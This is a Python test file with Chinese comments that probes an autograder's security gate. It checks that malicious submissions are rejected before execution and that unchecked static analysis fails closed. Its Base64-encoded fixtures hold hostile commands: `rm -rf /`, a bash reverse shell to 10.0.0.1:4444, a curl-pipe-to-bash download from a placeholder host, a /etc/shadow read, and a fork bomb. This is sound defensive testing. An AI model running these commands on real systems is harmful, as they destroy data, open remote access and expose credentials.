"""独立复核探针 B（复核者编写，非实现者）——标准 2 与标准 3 的**端到端**事实。

覆盖：
- 标准 2：五类恶意样本各过一次**真实规则实现**（`decide_static`）⇒ `security_finding` + 阻断；
  再逐条过一次**真实编排器**（真实静态层 + 生产安全适配器 `StaticSecurityDecider`）⇒
  真实状态 `rejected`、迁移史无 `running`、**计数 runner 替身零调用**、无结果行。
  配一条**正向对照**（干净提交必须真的被 runner 调用并走到 `completed`），否则"零调用"恒真。
  另证：静态层不阻断的样本仍被**安全阶段独立拒绝**（`security_blocked` + `b2.security_findings` 落行）。
- 标准 3：端到端"未发现风险 ⇒ completed"与"未检查 ⇒ failed"可区分；并记录一个**覆盖缺口**：
  静态层"部分未检查"时运行照样 completed，且报告里没有任何痕迹。

样本按仓库约定 Base64 存放（主机实时防护会删除盘上的完整高危形态），运行期解码；
落盘的那一份写后回读复核 SHA-256（被改写/删除即大声失败，而不是"零发现 ⇒ 假通过"）。

运行：`B2_TEST_DATABASE_URL=... python -m pytest tests/test_ss_probe_pipeline.py -q`
"""

from __future__ import annotations

import base64
import dataclasses
import hashlib
import pathlib
import shutil
import uuid
from collections.abc import Iterator, Mapping, Sequence
from dataclasses import dataclass
from datetime import UTC, datetime

import pytest
import sqlalchemy as sa
from sqlalchemy import Engine, text

from autograder_b2.domain.envelope import ApiProvenance, EnvelopeFile, SubmissionEnvelope
from autograder_b2.domain.evidence import CaseEvidence, SubmissionRunInput
from autograder_b2.evaluation import EvaluationOrchestrator
from autograder_b2.evaluation import report as report_module
from autograder_b2.evaluation import store as store_module
from autograder_b2.evaluation.ports import CaseDescriptor, ComparisonPolicy, PackageView
from autograder_b2.integration.adapters import StaticSecurityDecider
from autograder_b2.security import allows_dynamic_execution, decide_static, terminal_reason
from autograder_b2.static import analyze_static
from autograder_b2.static import checker as static_checker
from tests.conftest import requires_postgres

pytestmark = requires_postgres

BASE = datetime(2026, 9, 15, 8, 0, 0, 100_000, tzinfo=UTC)


def _b64(blob: str) -> bytes:
    return base64.b64decode(blob)


#: 五类恶意样本：(名称, 语言, 工作区文件名, Base64 源, 期望命中的安全规则)。
MALICIOUS = (
    ("destructive_rm_root", "python", "main.py",
     "aW1wb3J0IG9zCgpvcy5zeXN0ZW0oInJtIC1yZiAvIikK", frozenset({"SEC-DESTRUCTIVE-CMD"})),
    ("reverse_shell", "bash", "main.sh",
     "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjEKc2V0IC1lCg==",
     frozenset({"SEC-REVERSE-SHELL"})),
    ("pipe_download_exec", "bash", "main.sh",
     "c2V0IC1lCmN1cmwgLWZzU0wgaHR0cDovL2V4YW1wbGUuaW52YWxpZC94LnNoIHwgYmFzaAo=",
     frozenset({"SEC-PIPE-DOWNLOAD-EXEC"})),
    ("read_shadow_file", "python", "main.py",
     "cHJpbnQob3BlbigiL2V0Yy9zaGFkb3ciKS5yZWFkKCkpCg==",
     frozenset({"SEC-SENSITIVE-PATH-READ"})),
    ("unbounded_fork", "bash", "main.sh",
     "OigpeyA6fDomIH07OgpzZXQgLWUK", frozenset({"SEC-FORK-BOMB"})),
)

#: 安全规则层命中、但**静态合法性层不阻断**的样本（证明安全阶段真的会独立拒绝）。
NETWORK_ONLY_SOURCE = (
    "import socket\n"
    "\n"
    "\n"
    "def send() -> None:\n"
    "    sock = socket.socket()\n"
    "    sock.connect(('10.0.0.1', 4444))\n"
)

CLEAN_SOURCE = (
    "import sys\n"
    "\n"
    "\n"
    "def main() -> None:\n"
    "    value = int(sys.stdin.read() or '0')\n"
    "    print(value + 1)\n"
    "\n"
    "\n"
    'if __name__ == "__main__":\n'
    "    main()\n"
)

#: 干净 Bash（含严格模式：结构检查零 finding，便于观察覆盖缺口）。
CLEAN_BASH = b"#!/usr/bin/env bash\nset -euo pipefail\nread -r n\necho $((n + 1))\n"


def _digest(value: str) -> str:
    return hashlib.sha256(value.encode("utf-8")).hexdigest()


def _sha256(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


DIGEST_SUBMISSION = _digest("probe-submission")
DIGEST_PACKAGE = _digest("probe-package")
DIGEST_POLICY = _digest("probe-policy")
DIGEST_ENV = _digest("probe-environment")
DIGEST_QUESTION = _digest("probe-question")


# ---------------------------------------------------------------- 夹具（自写）


def _column_types(engine: Engine, table: str) -> dict[str, str]:
    with engine.connect() as connection:
        rows = connection.execute(
            text(
                "SELECT column_name, data_type FROM information_schema.columns"
                " WHERE table_schema = 'b2' AND table_name = :table"
            ),
            {"table": table},
        ).fetchall()
    return {row[0]: row[1] for row in rows}


def _seed_submission(engine: Engine) -> tuple[uuid.UUID, uuid.UUID]:
    identifier = uuid.uuid4()
    question = uuid.uuid4()
    correlation = uuid.uuid5(uuid.NAMESPACE_URL, f"probe:{identifier}")
    values: dict[str, object] = {
        "submission_id": identifier,
        "student_id": uuid.uuid4(),
        "course_id": uuid.uuid4(),
        "section_id": uuid.uuid4(),
        "question_version_id": question,
        "intake": "api",
        "idempotency_key": f"probe-{identifier}",
        "idempotency_scope": "probe",
        "submission_digest": DIGEST_SUBMISSION,
        "state": "queued",
        "created_at": BASE,
        "updated_at": BASE,
    }
    columns = _column_types(engine, "submissions")
    for name in ("correlation_id", "request_id"):
        if name in columns:
            values[name] = correlation if columns[name] == "uuid" else str(correlation)
    for name in ("mailbox", "uidvalidity", "uid", "message_id"):
        if name in columns:
            values[name] = None
    statement = (
        "INSERT INTO b2.submissions ("
        + ", ".join(values)
        + ") VALUES ("
        + ", ".join(f":{key}" for key in values)
        + ")"
    )
    with engine.begin() as connection:
        connection.execute(sa.text(statement), values)
    return identifier, question


def _envelope(
    *, submission_id: uuid.UUID, question_version_id: uuid.UUID, contents: Mapping[str, bytes]
) -> SubmissionEnvelope:
    files = tuple(
        EnvelopeFile(
            path=path,
            content_sha256=_sha256(content),
            size_bytes=len(content),
            storage_ref=f"sha256/{_sha256(content)}",
        )
        for path, content in contents.items()
    )
    correlation = str(uuid.uuid5(uuid.NAMESPACE_URL, f"probe:{submission_id}"))
    return SubmissionEnvelope(
        submission_id=str(submission_id),
        student_id=str(uuid.uuid4()),
        course_id=str(uuid.uuid4()),
        section_id=str(uuid.uuid4()),
        question_version_id=str(question_version_id),
        idempotency_key=f"probe-{submission_id}",
        intake="api",
        provenance=ApiProvenance(request_id=correlation),
        correlation_id=correlation,
        files=files,
        submission_digest=DIGEST_SUBMISSION,
        received_at=BASE,
    )


class _MaterializingWorkspaces:
    """把提交内容写进服务端生成的目录，并在写后回读复核 SHA-256（防"样本被删 ⇒ 假通过"）。"""

    def __init__(self, root: pathlib.Path, contents: Mapping[str, bytes]) -> None:
        self.root = root
        self.contents = dict(contents)
        self.prepared: list[pathlib.Path] = []

    def prepare(
        self,
        *,
        submission_id: str,
        evaluation_run_id: str,
        files: Sequence[EnvelopeFile],
        case_id: str | None = None,
    ) -> pathlib.Path:
        scope = "run" if case_id is None else f"case-{case_id[:8]}"
        target = self.root / f"ws-{evaluation_run_id[:8]}-{scope}-{len(self.prepared)}"
        target.mkdir(parents=True, exist_ok=False)
        for item in files:
            payload = self.contents[item.path]
            destination = target / item.path
            destination.parent.mkdir(parents=True, exist_ok=True)
            destination.write_bytes(payload)
            assert _sha256(destination.read_bytes()) == item.content_sha256, (
                f"落盘内容与提交摘要不符（样本可能被实时防护改写/删除）：{item.path}"
            )
        self.prepared.append(target)
        return target

    def release(self, workspace: pathlib.Path) -> None:
        return None


class _FixedPackages:
    def __init__(self, view: PackageView) -> None:
        self.view = view

    def fetch(self, *, evaluation_run_id: str, question_version_id: str) -> PackageView:
        return self.view


@dataclass(frozen=True, slots=True)
class _CaseHandle:
    case_id: str
    ordinal: int
    weight: float


class _CountingRunner:
    """**测试替身**：只记录调用并回一条构造好的证据，不做任何沙箱执行。

    它是"动态评测是否被触发"的可信计数器——比 `runner_invocations` 更硬（后者在 rejected
    路径上由 `orchestrator.py:917` 硬编码为 0，是常量而非测量值）。
    """

    def __init__(self) -> None:
        self.calls: list[dict[str, object]] = []

    def run_case(self, package: object, submission: SubmissionRunInput) -> CaseEvidence:
        handle = submission.case
        case_id = str(handle.case_id)  # type: ignore[attr-defined]
        self.calls.append({"case_id": case_id, "workspace": pathlib.Path(submission.workspace)})
        return CaseEvidence(
            case_id=case_id,
            ordinal=int(handle.ordinal),  # type: ignore[attr-defined]
            weight=float(handle.weight),  # type: ignore[attr-defined]
            passed=True,
            failure_category=None,
            input_digest=_digest(f"in:{case_id}"),
            stdout_digest=_digest(f"out:{case_id}"),
            stderr_digest=_digest(""),
            actual_output_excerpt="1",
            expected_output_excerpt="1",
            exit_code=0,
            duration_ms=3,
            resource_limit_hit=None,
            sandbox_violations=(),
            message=None,
            evidence_digest=_digest(f"ev:{case_id}"),
        )


def _package_view(language: str) -> PackageView:
    case_id = str(uuid.uuid4())
    return PackageView(
        package_digest=DIGEST_PACKAGE,
        language=language,
        cases=(
            CaseDescriptor(
                case_id=case_id,
                ordinal=0,
                weight=5.0,
                visible_to_student=True,
                handle=_CaseHandle(case_id=case_id, ordinal=0, weight=5.0),
            ),
        ),
        runner_policy_digest=DIGEST_POLICY,
        environment_digest=DIGEST_ENV,
        comparison=ComparisonPolicy(stdout="exact"),
        question_version_binding=DIGEST_QUESTION,
        interpreter_version="CPython 3.12",
        handle={"package": "probe"},
        adapter_handle={"adapter": "probe"},
        policy_handle={"policy": "probe"},
    )


@dataclass(frozen=True, slots=True)
class _Rig:
    outcome: object
    runner: _CountingRunner
    workspaces: _MaterializingWorkspaces


def _run_submission(
    engine: Engine, root: pathlib.Path, *, contents: Mapping[str, bytes], language: str
) -> _Rig:
    submission_id, question_version_id = _seed_submission(engine)
    runner = _CountingRunner()
    workspaces = _MaterializingWorkspaces(root, contents)
    orchestrator = EvaluationOrchestrator(
        engine=engine,
        package_source=_FixedPackages(_package_view(language)),
        workspace_provider=workspaces,
        security=StaticSecurityDecider(),
        runner=runner,
    )
    envelope = _envelope(
        submission_id=submission_id, question_version_id=question_version_id, contents=contents
    )
    return _Rig(orchestrator.run(envelope), runner, workspaces)


def _run_facts(engine: Engine, run_id: str) -> dict[str, object]:
    with engine.connect() as connection:
        row = store_module.load_run(connection, run_id)
        history = [item.to_state for item in store_module.run_history(connection, run_id)]
        static_rows = store_module.load_static_findings(connection, run_id)
        security_rows = store_module.load_security_findings(connection, run_id)
        result = store_module.load_result(connection, run_id)
    return {
        "state": None if row is None else row.state,
        "terminal_reason": None if row is None else row.terminal_reason,
        "history": history,
        "static_findings": static_rows,
        "security_findings": security_rows,
        "result": result,
    }


@pytest.fixture()
def probe_root(tmp_path: pathlib.Path) -> Iterator[pathlib.Path]:
    root = tmp_path / "probe-workspaces"
    root.mkdir()
    yield root
    shutil.rmtree(root, ignore_errors=True)
    assert not root.exists()


# ---------------------------------------------------------------- 标准 2


@pytest.mark.parametrize(
    "name,language,filename,blob,expected_rules",
    MALICIOUS,
    ids=[case[0] for case in MALICIOUS],
)
def test_probe_std2_real_rules_emit_security_findings_for_each_sample(
    name: str, language: str, filename: str, blob: str, expected_rules: frozenset[str]
) -> None:
    """五类恶意样本各过一次**真实规则实现**（非替身）：found + 阻断；样本只在内存里。"""
    source = _b64(blob).decode("utf-8")
    assert source.strip(), f"{name}: 样本解码为空"
    decision = decide_static({filename: source}, language=language)

    assert decision.status == "found", f"{name}: 实际 {decision.status}"
    assert decision.findings
    assert decision.unchecked == (), f"{name}: 必需检查项应全部执行"
    ids = {finding.rule_id for finding in decision.findings}
    assert expected_rules <= ids, f"{name}: 期望含 {sorted(expected_rules)}，实际 {sorted(ids)}"
    for finding in decision.findings:
        assert finding.rule_id and finding.detected_in == "static" and finding.message
    assert any(finding.severity == "high" for finding in decision.findings), name
    assert decision.blocking is True
    assert allows_dynamic_execution(decision) is False
    assert terminal_reason(decision) == "static_blocked"


def test_probe_std2_malicious_submission_is_rejected_without_any_runner_call(
    engine: Engine, probe_root: pathlib.Path
) -> None:
    """过**真实编排器**：`rejected`、迁移史无 `running`、runner **零调用**、无结果行。"""
    observations: list[tuple[str, str, str, str, int]] = []
    for name, language, filename, blob, _expected in MALICIOUS:
        payload = _b64(blob)
        rig = _run_submission(engine, probe_root, contents={filename: payload}, language=language)
        facts = _run_facts(engine, rig.outcome.evaluation_run_id)  # type: ignore[attr-defined]
        calls = len(rig.runner.calls)

        assert rig.outcome.state == "rejected", (name, rig.outcome.state)  # type: ignore[attr-defined]
        assert facts["state"] == "rejected"
        assert facts["terminal_reason"] in {"static_blocked", "security_blocked"}, (
            name,
            facts["terminal_reason"],
        )
        assert "running" not in facts["history"], (name, facts["history"])
        assert calls == 0, f"{name}: 动态评测被触发了 {calls} 次"
        assert rig.outcome.runner_invocations == 0, name  # type: ignore[attr-defined]
        assert facts["result"] is None

        written = [
            path
            for workspace in rig.workspaces.prepared
            for path in workspace.rglob("*")
            if path.is_file()
        ]
        assert any(_sha256(path.read_bytes()) == _sha256(payload) for path in written), (
            f"{name}: 磁盘上找不到与样本摘要一致的字节"
        )
        static_rows = facts["static_findings"]
        assert static_rows and any(item.blocking for item in static_rows), name
        observations.append(
            (
                name,
                str(facts["terminal_reason"]),
                ",".join(sorted({item.rule_id for item in static_rows})),
                ",".join(sorted({item.rule_id or "-" for item in facts["security_findings"]})) or "-",
                calls,
            )
        )

    print("\n[probe] 恶意样本 → 真实编排器：")
    for name, terminal, static_rules, security_rules, calls in observations:
        print(
            f"   name={name} terminal={terminal} static_rules={static_rules}"
            f" security_rules={security_rules} runner_calls={calls}"
        )


def test_probe_std2_clean_submission_really_reaches_the_runner(
    engine: Engine, probe_root: pathlib.Path
) -> None:
    """**正向对照**：干净提交必须真的被 runner 调用并走到 `completed`（否则"零调用"恒真）。"""
    rig = _run_submission(
        engine, probe_root, contents={"main.py": CLEAN_SOURCE.encode("utf-8")}, language="python"
    )
    facts = _run_facts(engine, rig.outcome.evaluation_run_id)  # type: ignore[attr-defined]
    assert len(rig.runner.calls) == 1, rig.runner.calls
    assert rig.outcome.state == "completed", (  # type: ignore[attr-defined]
        rig.outcome.state,  # type: ignore[attr-defined]
        rig.outcome.message,  # type: ignore[attr-defined]
    )
    assert facts["history"] == ["queued", "running", "completed"], facts["history"]
    assert facts["result"] is not None
    assert facts["static_findings"] == [] and facts["security_findings"] == []


def test_probe_std2_security_stage_alone_rejects_and_persists_security_finding(
    engine: Engine, probe_root: pathlib.Path
) -> None:
    """静态层不阻断的样本必须被**安全阶段独立**拒绝（`security_blocked` + 落行 + 零调用）。"""
    source = NETWORK_ONLY_SOURCE
    baseline = analyze_static(
        workspace=_materialize(probe_root, {"main.py": source.encode("utf-8")}),
        files=["main.py"],
        language="python",
    )
    assert baseline.blocking is False, "该样本不应被静态合法性层阻断（否则证明不了安全阶段）"
    assert baseline.error_count == 0
    assert {item.checker: item.status for item in baseline.checks} == {
        "python_ast": "ran",
        "structural_rules": "ran",
    }

    rig = _run_submission(
        engine, probe_root, contents={"main.py": source.encode("utf-8")}, language="python"
    )
    facts = _run_facts(engine, rig.outcome.evaluation_run_id)  # type: ignore[attr-defined]
    assert rig.outcome.state == "rejected"  # type: ignore[attr-defined]
    assert facts["terminal_reason"] == "security_blocked", facts["terminal_reason"]
    assert "running" not in facts["history"], facts["history"]
    assert rig.runner.calls == [] and facts["result"] is None

    rows = facts["security_findings"]
    assert rows, "安全层阻断必须在 b2.security_findings 留下行"
    assert {item.rule_id for item in rows} == {"SEC-NETWORK-CALL"}
    assert all(item.severity == "high" and item.blocking for item in rows)
    assert all(item.detected_in == "static" for item in rows)


def _materialize(root: pathlib.Path, contents: Mapping[str, bytes]) -> pathlib.Path:
    target = root / f"standalone-{uuid.uuid4().hex[:8]}"
    target.mkdir(parents=True, exist_ok=False)
    for name, payload in contents.items():
        (target / name).write_bytes(payload)
    return target


# ---------------------------------------------------------------- 标准 3（端到端）


def test_probe_std3_not_found_completes_while_not_checked_fails(
    engine: Engine, probe_root: pathlib.Path
) -> None:
    """端到端可区分：`not_found` ⇒ `completed`；`not_checked` ⇒ `failed`（且不调 runner）。"""
    clean = _run_submission(
        engine, probe_root, contents={"main.py": CLEAN_SOURCE.encode("utf-8")}, language="python"
    )
    clean_facts = _run_facts(engine, clean.outcome.evaluation_run_id)  # type: ignore[attr-defined]
    assert clean.outcome.state == "completed"  # type: ignore[attr-defined]

    broken = 'x = """never closed\n'
    bad = _run_submission(
        engine, probe_root, contents={"main.py": broken.encode("utf-8")}, language="python"
    )
    bad_facts = _run_facts(engine, bad.outcome.evaluation_run_id)  # type: ignore[attr-defined]
    assert bad.outcome.state == "failed", bad.outcome.state  # type: ignore[attr-defined]
    assert bad_facts["terminal_reason"] == "infrastructure_error", bad_facts["terminal_reason"]
    assert bad_facts["terminal_reason"] != "security_blocked"
    assert bad.runner.calls == []
    assert clean_facts["result"] is not None and bad_facts["result"] is None


def test_probe_std3_partial_static_coverage_gap_is_visible_end_to_end(
    engine: Engine, probe_root: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """**修复后的探针**：静态层"部分未检查"必须让运行 fail-closed，且在端到端**可见**。

    本探针原先记录的是**缺陷**（当时命名为 `..._is_invisible_in_the_run_report`）：编排器只在**全部**
    检查都 `not_checked` 时才失败，于是"某项静态检查没跑"（例如 worker 上没有 bash ⇒
    `bash_syntax = not_checked`、`structural_rules = ran`）会一路走到计分与 `completed`，
    **未检查被静默当成了通过**，动态评测还会照跑。修复后（`orchestrator._run_static`：
    阻断优先，其次**任何**必需检查未跑即终止）它改为钉住正确行为。

    残留限制（如实记录，属契约面）：`evaluation-report` 的 `static_findings` 只由 `static.findings`
    派生，schema 里没有承载检查状态的字段 ⇒ **报告本身**仍表达不了覆盖状态；"未检查"这一事实由
    SSE 帧消息（落 `progress_events`）与运行终态 `failed + infrastructure_error` 表达。
    """
    monkeypatch.setattr(static_checker.bash_checker, "probe_bash", lambda: None)
    workspace = _materialize(probe_root, {"main.sh": CLEAN_BASH})
    result = analyze_static(workspace=workspace, files=["main.sh"], language="bash")
    syntax = next(item for item in result.checks if item.checker == "bash_syntax")

    rig = _run_submission(engine, probe_root, contents={"main.sh": CLEAN_BASH}, language="bash")
    facts = _run_facts(engine, rig.outcome.evaluation_run_id)  # type: ignore[attr-defined]

    print(
        f"\n[probe] bash 静态覆盖: bash_syntax={syntax.status!r}"
        f" 运行终态={facts['state']} reason={facts['terminal_reason']}"
        f" runner_calls={len(rig.runner.calls)} static_findings={len(facts['static_findings'])}"
    )

    # 覆盖状态与"报告 static_findings 只由 findings 派生"这两条事实不因修复而改变（纯函数层面）。
    flipped = dataclasses.replace(
        result,
        checks=tuple(
            dataclasses.replace(item, status="ran", reason=None)
            if item.checker == "bash_syntax"
            else item
            for item in result.checks
        ),
    )
    assert flipped != result, "两组覆盖状态本应不同"
    assert report_module._static_findings(flipped) == report_module._static_findings(result)

    if syntax.status != "not_checked":
        assert syntax.reason is None
        return

    assert syntax.reason and "未执行" in syntax.reason
    # 修复后：部分未检查 ⇒ fail-closed，且**不再进入动态评测**。
    assert facts["state"] == "failed", facts["state"]
    assert facts["terminal_reason"] == "infrastructure_error", facts["terminal_reason"]
    assert facts["terminal_reason"] != "static_blocked", "我们没发现任何东西，只是没检查"
    assert rig.runner.calls == [], rig.runner.calls  # type: ignore[attr-defined]
    assert facts["result"] is None, "未完成的运行不得有结果行"
    # 该事实在端到端可见：SSE 帧消息（落 `progress_events`）点名了未执行的检查。
    with engine.connect() as connection:
        messages = [
            str(row[0])
            for row in connection.execute(
                text("SELECT message FROM b2.progress_events WHERE evaluation_run_id = :r"),
                {"r": rig.outcome.evaluation_run_id},  # type: ignore[attr-defined]
            ).fetchall()
        ]
    assert any("bash_syntax" in message for message in messages), messages
